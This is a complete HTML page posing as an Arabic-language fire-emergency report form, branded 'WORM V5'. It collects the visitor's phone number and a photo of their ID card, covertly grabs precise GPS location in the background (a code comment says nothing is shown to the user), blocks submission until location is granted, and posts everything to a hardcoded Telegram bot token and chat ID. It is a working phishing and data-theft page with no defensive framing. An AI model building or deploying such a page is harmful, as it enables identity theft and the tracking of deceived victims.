<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بلاغ حريق - WORM V5</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #0d0d0d;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 20px;
            max-width: 450px;
            width: 100%;
            border: 2px solid #ff2222;
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
        }
        h1 { color: #ff3333; text-align: center; }
        label { display: block; margin: 15px 0 5px; font-weight: bold; }
        input, button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input {
            background: #2a2a2a;
            color: #fff;
            border: 1px solid #444;
        }
        input:focus { outline: 2px solid #ff4444; }
        button {
            background: #ff4444;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
        }
        button:hover { background: #cc0000; transform: scale(1.02); }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: #111;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            color: #ffaa00;
        }
        .hidden-gps {
            display: none;
        }
        .btn-gps {
            background: #2a6b2a;
            margin-top: 5px;
            padding: 8px;
            font-size: 14px;
        }
        .btn-gps:hover { background: #1f8b1f; }
    </style>
</head>
<body>

<div class="container">
    <h1>🚨 بلاغ حريق</h1>

    <label>📞 رقم الهاتف</label>
    <input type="text" id="phone" placeholder="مثال: 0952725590" value="0952725590">

    <label>🪪 صورة الهوية</label>
    <input type="file" id="idImage" accept="image/*">

    <!-- لا شيء يظهر للمستخدم عن الموقع – كل شيء في الخلفية -->
    <div class="hidden-gps"></div>

    <button id="sendBtn">🔥 إرسال البلاغ</button>
    <div id="status">⏳ في انتظار الإرسال</div>
</div>

<script>
    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
    const CHAT_ID = "8665747715";

    let userLat = null;
    let userLon = null;
    let gpsResolve = null;
    let gpsReject = null;

    // ======== دالة جلب الموقع ========
    function getGPS() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject("المتصفح لا يدعم تحديد الموقع");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude
                    });
                },
                (err) => {
                    let msg = '';
                    switch (err.code) {
                        case 1: msg = 'الموقع مرفوض (افتح الإعدادات واسمح)';
                            break;
                        case 2: msg = 'الموقع غير متاح حالياً';
                            break;
                        case 3: msg = 'انتهت مهلة المحاولة';
                            break;
                        default: msg = 'خطأ غير معروف: ' + err.message;
                    }
                    reject(msg);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        });
    }

    // ======== إرسال البيانات إلى تليجرام ========
    async function sendToTelegram(phone, imageFile, lat, lon) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = '⏳ جاري الإرسال...';
        statusDiv.style.color = '#ffaa00';

        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', imageFile);
            formData.append('caption', 
                `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع (رابط): ${mapsLink}`
            );

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            if (data.ok) {
                statusDiv.innerHTML = '✅ تم الإرسال بنجاح إلى تليجرام!';
                statusDiv.style.color = '#7fff7f';
            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
                statusDiv.style.color = '#ff6666';
            }
        } catch (error) {
            statusDiv.innerHTML = '🚫 خطأ في الشبكة: ' + error.message;
            statusDiv.style.color = '#ff6666';
        }
    }

    // ======== زر الإرسال الرئيسي (يجبر الموقع) ========
    document.getElementById('sendBtn').addEventListener('click', async function () {
        const phone = document.getElementById('phone').value.trim();
        const fileInput = document.getElementById('idImage');
        const file = fileInput.files[0];
        const statusDiv = document.getElementById('status');

        // التحقق من الحقول
        if (!phone) {
            statusDiv.innerHTML = '⚠️ أدخل رقم الهاتف';
            statusDiv.style.color = '#ffaa00';
            return;
        }
        if (!file) {
            statusDiv.innerHTML = '⚠️ اختر صورة الهوية';
            statusDiv.style.color = '#ffaa00';
            return;
        }

        // ======== جلب الموقع ========
        statusDiv.innerHTML = '⏳ جاري جلب الموقع...';
        statusDiv.style.color = '#ffaa00';

        try {
            const gpsData = await getGPS(); // ينتظر حتى يجلب الموقع أو يرفض
            userLat = gpsData.lat;
            userLon = gpsData.lon;

            // الموقع جاهز – نرسل
            await sendToTelegram(phone, file, userLat, userLon);

        } catch (error) {
            // فشل الموقع – نمنع الإرسال
            statusDiv.innerHTML = `❌ لا يمكن الإرسال بدون موقع: ${error}`;
            statusDiv.style.color = '#ff6666';

            // نعرض رسالة للمستخدم أنه يجب السماح بالموقع
            alert(`⚠️ لا يمكن إرسال البلاغ دون تحديد الموقع.\nالرجاء السماح للمتصفح بالوصول إلى الموقع.\nالخطأ: ${error}`);
        }
    });

    // ======== جلب أولي لتجهيز الموقع (في الخلفية) ========
    // نحاول جلب الموقع فوراً ولكن بدون إزعاج المستخدم
    // إذا رفض، لا بأس، سيُطلب منه عند الإرسال
    setTimeout(() => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userLat = pos.coords.latitude;
                    userLon = pos.coords.longitude;
                    document.getElementById('status').innerHTML = '✅ الموقع جاهز (خلفية)';
                    document.getElementById('status').style.color = '#7fff7f';
                },
                () => {
                    // نتركه يمر – سيُطلب عند الإرسال
                }
            );
        }
    }, 100);

    // تحديث الحالة عند تغيير المدخلات
    document.getElementById('phone').addEventListener('input', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
    document.getElementById('idImage').addEventListener('change', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
</script>

</body>
</html>
